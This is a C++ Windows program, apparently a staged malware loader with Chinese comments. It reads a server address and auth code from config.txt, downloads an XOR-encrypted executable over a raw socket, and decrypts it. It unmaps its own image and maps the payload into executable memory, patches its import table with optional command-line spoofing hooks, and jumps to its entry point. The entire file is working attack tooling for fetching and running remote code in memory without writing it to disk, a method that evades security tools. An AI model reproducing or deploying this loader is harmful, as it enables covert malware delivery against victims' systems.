#include <WinSock2.h>
#include <stdio.h>
#include <windows.h>
#include <stdint.h>

#pragma warning (disable: 4996)
#pragma comment(lib,"WS2_32.lib")
#define _CRT_SECURE_NO_WARNINGS

///////////////////////////////////////////////
//          CONFIGURATION   HERE             //
///////////////////////////////////////////////
char ip[50] = { 0 };
int port = 0;
char authcode[50] = "123456";
#define CHUNK_SIZE 200
///////////////////////////////////////////////
//          CONFIGURATION   DONE             //
///////////////////////////////////////////////

bool hijackCmdline = false;
char* sz_masqCmd_Ansi = NULL, * sz_masqCmd_ArgvAnsi[100] = {  };
wchar_t* sz_masqCmd_Widh = NULL, * sz_masqCmd_ArgvWidh[100] = { };
int int_masqCmd_Argc = 0;
LPWSTR hookGetCommandLineW() { return sz_masqCmd_Widh; }
LPSTR hookGetCommandLineA() { return sz_masqCmd_Ansi; }

int __wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless) {
	*_Argc = int_masqCmd_Argc;
	*_Argv = (wchar_t**)sz_masqCmd_ArgvWidh;
	return 0;
}
int __getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless) {
	*_Argc = int_masqCmd_Argc;
	*_Argv = (char**)sz_masqCmd_ArgvAnsi;
	return 0;
}

char* GetNTHeaders(char* pe_buffer)
{
	if (pe_buffer == NULL) return NULL;

	IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)pe_buffer;
	if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
		return NULL;
	}
	const LONG kMaxOffset = 1024;
	LONG pe_offset = idh->e_lfanew;
	if (pe_offset > kMaxOffset) return NULL;
	IMAGE_NT_HEADERS32* inh = (IMAGE_NT_HEADERS32*)((char*)pe_buffer + pe_offset);
	if (inh->Signature != IMAGE_NT_SIGNATURE) return NULL;
	return (char*)inh;
}

IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id)
{
	if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;

	char* nt_headers = GetNTHeaders((char*)pe_buffer);
	if (nt_headers == NULL) return NULL;

	IMAGE_DATA_DIRECTORY* peDir = NULL;

	IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)nt_headers;
	peDir = &(nt_header->OptionalHeader.DataDirectory[dir_id]);

	if (peDir->VirtualAddress == NULL) {
		return NULL;
	}
	return peDir;
}

bool RepairIAT(PVOID modulePtr)
{
	//printf("[+] Fix Import Address Table\n");
	IMAGE_DATA_DIRECTORY* importsDir = GetPEDirectory(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT);
	if (importsDir == NULL) return false;

	size_t maxSize = importsDir->Size;
	size_t impAddr = importsDir->VirtualAddress;

	IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
	size_t parsedSize = 0;

	for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
		lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + parsedSize + (ULONG_PTR)modulePtr);

		if (lib_desc->OriginalFirstThunk == NULL && lib_desc->FirstThunk == NULL) break;
		LPSTR lib_name = (LPSTR)((ULONGLONG)modulePtr + lib_desc->Name);
		//printf("    [+] Import DLL: %s\n", lib_name);

		size_t call_via = lib_desc->FirstThunk;
		size_t thunk_addr = lib_desc->OriginalFirstThunk;
		if (thunk_addr == NULL) thunk_addr = lib_desc->FirstThunk;

		size_t offsetField = 0;
		size_t offsetThunk = 0;
		while (true)
		{
			IMAGE_THUNK_DATA* fieldThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetField + call_via);
			IMAGE_THUNK_DATA* orginThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetThunk + thunk_addr);

			if (orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) // check if using ordinal (both x86 && x64)
			{
				size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));
				//printf("        [V] API %x at %x\n", orginThunk->u1.Ordinal, addr);
				fieldThunk->u1.Function = addr;
			}

			if (fieldThunk->u1.Function == NULL) break;

			if (fieldThunk->u1.Function == orginThunk->u1.Function) {

				PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)(size_t(modulePtr) + orginThunk->u1.AddressOfData);

				LPSTR func_name = (LPSTR)by_name->Name;
				size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), func_name);
				//printf("        [V] API %s at %x\n", func_name, addr);

				if (hijackCmdline && strcmpi(func_name, "GetCommandLineA") == 0)
					fieldThunk->u1.Function = (size_t)hookGetCommandLineA;
				else if (hijackCmdline && strcmpi(func_name, "GetCommandLineW") == 0)
					fieldThunk->u1.Function = (size_t)hookGetCommandLineW;
				else if (hijackCmdline && strcmpi(func_name, "__wgetmainargs") == 0)
					fieldThunk->u1.Function = (size_t)__wgetmainargs;
				else if (hijackCmdline && strcmpi(func_name, "__getmainargs") == 0)
					fieldThunk->u1.Function = (size_t)__getmainargs;
				else
					fieldThunk->u1.Function = addr;

			}
			offsetField += sizeof(IMAGE_THUNK_DATA);
			offsetThunk += sizeof(IMAGE_THUNK_DATA);
		}
	}
	return true;
}

void xorLoopDecryption(unsigned char* data, unsigned int size) {
	unsigned int j = 0;
	for (int i = size - 2; i >= 0; i--) {
		j = i + 1;
		if (j > size - 2) {
			j = j - size + 1;
		}
		data[i] = data[i] ^ data[j] + size;
	}
}

void xorChunkDecryption(unsigned char* data, unsigned int size, unsigned int chunk_max_size) {
	unsigned int offset = 0;
	unsigned int chunk_size = 0;
	while (1) {
		if (offset + chunk_max_size > size) {
			chunk_size = size - offset;
		}
		else {
			chunk_size = chunk_max_size;
		}
		xorLoopDecryption(data + offset, chunk_size);
		offset += chunk_max_size;
		if (offset >= size) break;
	}
}

void GetPEFromRemoteServer(char** PEData, long long* PESize)
{
	char stage1Data[20];
	WSADATA wsData;
	if (WSAStartup(MAKEWORD(2, 2), &wsData))
	{
		printf("[error] WSAStartp fail.\n");
		exit(0);
	}

	SOCKET		sock = WSASocket(AF_INET, SOCK_STREAM, 0, 0, 0, 0);
	SOCKADDR_IN	server;
	ZeroMemory(&server, sizeof(SOCKADDR_IN));
	server.sin_family = AF_INET;

	server.sin_addr.s_addr = inet_addr(ip);
	server.sin_port = htons(port);

	if (SOCKET_ERROR == connect(sock, (SOCKADDR*)&server, sizeof(server)))
	{
		printf("[error] connect to server fail.\n");
		exit(0);
	}

	send(sock, authcode, sizeof(authcode), 0);

	memset(stage1Data, 0, sizeof(stage1Data));
	recv(sock, stage1Data, sizeof(stage1Data), 0);
	if (strncmp("EF", stage1Data, strlen("EF")) == 0) {
		printf("[error] auth failed.(%s)\n", stage1Data);
		exit(0);
	}
	int dataSize = atoi(stage1Data + 2);
	*PESize = dataSize;
	if (dataSize < sizeof(stage1Data)) {
		printf("[error] dataSize too small %ld.\n", dataSize);
		exit(0);
	}
	*PEData = (char*)malloc(dataSize);
	int ret = 0;
	int i = 0;
	do
	{
		if (dataSize > CHUNK_SIZE) {
			ret = recv(sock, *PEData + i, CHUNK_SIZE, 0);
			i += CHUNK_SIZE;
		}
		else {
			ret = recv(sock, *PEData + i, dataSize, 0);
			i += dataSize;
			break;
		}
		dataSize -= ret;
	} while (dataSize > 0);

	closesocket(sock);
	WSACleanup();

}

void PELoader(char* data, const long long datasize)
{
	unsigned int chksum = 0;
	for (long long i = 0; i < datasize; i++) { chksum = data[i] * i + chksum / 3; };

	BYTE* pImageBase = NULL;
	LPVOID preferAddr = 0;

	// step 1 : 获取NT头信息
	printf("  -- 1 GET NT Header\n");
	IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)GetNTHeaders(data);
	if (!ntHeader) {
		printf("[error] Invaild PE.\n");
		exit(0);
	}

	IMAGE_DATA_DIRECTORY* relocDir = GetPEDirectory(data, IMAGE_DIRECTORY_ENTRY_BASERELOC);
	preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;

	// step 2 : 卸载旧内存信息，腾出空间用以填充PE进来。
	//隐式加载NtUnmapViewOfSection卸载掉原进程占用的内存，为后期填充PE作准备。（这部分功能有猜测性质）
	printf("  -- 2 GET API NtUnmapViewOfSection from ntdll.dll\n");
	HMODULE dll = LoadLibraryA("ntdll.dll");
	((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll, "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);

	// step 3: 申请新空间，这部分空间放置PE。
	printf("  -- 3 VirtualAlloc Memory\n");
	pImageBase = (BYTE*)VirtualAlloc(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pImageBase) {
		if (!relocDir) {
			exit(0);
		}
		else {
			pImageBase = (BYTE*)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			if (!pImageBase)
			{
				exit(0);
			}
		}
	}

	// step 4: section mapping，最终填到pImageBase上。"ntHeader->OptionalHeader.ImageBase"就是"(size_t)pImageBase"。
	printf("  -- 4 FILL the memory block with PEdata\n");
	ntHeader->OptionalHeader.ImageBase = (size_t)pImageBase;
	memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);

	IMAGE_SECTION_HEADER* SectionHeaderArr = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
	{
		//printf("    [+] Mapping Section %s\n", SectionHeaderArr[i].Name);
		memcpy(LPVOID(size_t(pImageBase) + SectionHeaderArr[i].VirtualAddress), LPVOID(size_t(data) + SectionHeaderArr[i].PointerToRawData), SectionHeaderArr[i].SizeOfRawData);
	}

	// step 5: 修复导入地址表
	printf("  -- 5 Fix the PE Import addr table (pImageBase:%p)\n", pImageBase);
	RepairIAT(pImageBase);

	// step 6: 寻找加载的PE的入口点，并指向运行。
	printf("  -- 6 Seek the AddressOfEntryPoint\n");
	size_t retAddr = (size_t)(pImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
	printf("  -- 7 Rush the PE in Memory (size %ld)(addr %p)(chksum %ud)\n", datasize, retAddr, chksum);
	((void(*)())retAddr)();
}

void GetConfiguration() {
	FILE* fp;
	char line[100];
	fp = fopen("config.txt", "rb");
	while (!feof(fp))
	{
		memset(line, 0, sizeof(line));
		fgets(line, 100, fp);
		if (strstr(line, "\r") != NULL) {
			strstr(line, "\r")[0] = '\0';
		}
		if (strstr(line, "\n") != NULL) {
			strstr(line, "\n")[0] = '\0';
		}
		//printf("%s\n",strstr(line,"ip = "));
		if (strstr(line, "ip = ") != NULL) {
			strcpy(ip, strstr(line, "ip = ") + strlen("ip = "));
		}
		if (strstr(line, "port = ") != NULL) {
			port = atoi(strstr(line, "port = ") + strlen("port = "));
		}
		if (strstr(line, "authcode = ") != NULL) {
			strcpy(authcode, strstr(line, "authcode = ") + strlen("authcode = "));
		}
	}
	fclose(fp);
}

int main(int argc, char** argv)
{

	long long PESize = 0;
	char* PE = NULL;
	// step0 读取配置文件
	printf("[+] GetConfiguration\n");
	GetConfiguration();

	// step1 获取PE文件
	printf("[+] GetPEFromRemoteServer\n");
	GetPEFromRemoteServer(&PE, &PESize);

	// step2 PE解密
	printf("[+] BinaryDecryption\n");
	xorChunkDecryption((unsigned char*)PE, PESize, 1000);

	// step3 PELoader
	printf("[+] Run PELoader\n");
	PELoader(PE, PESize);
}